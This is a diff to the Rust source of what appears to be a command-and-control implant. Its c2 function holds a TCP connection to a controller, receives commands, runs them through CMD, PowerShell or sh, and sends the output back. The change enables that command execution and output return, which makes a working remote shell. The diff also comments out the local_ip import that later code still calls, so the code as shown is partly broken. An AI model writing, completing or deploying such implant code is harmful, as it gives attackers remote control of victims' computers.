@@ -3,7 +3,7 @@ use std::net::TcpStream;
 use std::io::Write;
 use std::io::Read;
 use std::process::Command;
-use local_ip_address::local_ip;
+// use local_ip_address::local_ip;
 use std::{thread, time};
 use std::path::Path;
 use std::env::set_current_dir;
@@ -46,7 +46,7 @@ fn c2() {
     loop {
         let mut buffer = [0;1024]; //set the buffer
         println!("reading buffer");
-        let num_of_bytes = stream.read(&mut buffer).expect("buffer not read");
+        let num_of_bytes = stream.read(&mut buffer).expect("buffer not read"); //TODO will throw a connecfion reset by peer error, catch it
         if num_of_bytes == 0 { //if the connection is lost
             println!("bytes is 0, resetting");
             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds 
@@ -59,6 +59,7 @@ fn c2() {
             let local_ip = local_ip().unwrap(); //get the local IP
             let local_ip = format!("{}\n",local_ip); //format IP into string
             let local_ip = local_ip.as_bytes();
+            // let local_ip = "10.1.1.1".as_bytes();
             stream.write(&local_ip).unwrap(); //send it
             continue;
         }
@@ -68,7 +69,7 @@ fn c2() {
                 stream.write(match set_current_dir(path) { //write to the stream the current diretory after changing it
                     Ok(_) => { //if ok, return current directory
                         let cmd_out = if cfg!(windows) {
-                            Command::new("CMD").arg("/C").arg("cd").output().unwrap()
+                            Command::new("powershell").arg("-command").arg("cd").output().unwrap()
                         } else {
                             Command::new("sh").arg("-c").arg("pwd").output().unwrap()
                         };
@@ -86,10 +87,10 @@ fn c2() {
             }
         }
         println!("Command: {}",&recv);
-        // let output = run_command(&recv); //run this
+        let output = run_command(&recv); //run this
         // // let stderrout = format!("{}{}",String::from_utf8_lossy(&output.stdout),String::from_utf8_lossy(&output.stderr));
-        // // println!("Output: {}",stderrout);
-        stream.write(&recv.as_bytes()).unwrap(); //send that shit
+        // println!("Output: {}",stderrout);
+        stream.write(&output.as_bytes()).unwrap(); //send that shit
     }
     // stream.shutdown(Shutdown::Both).expect("shutdown call failed");
 }       
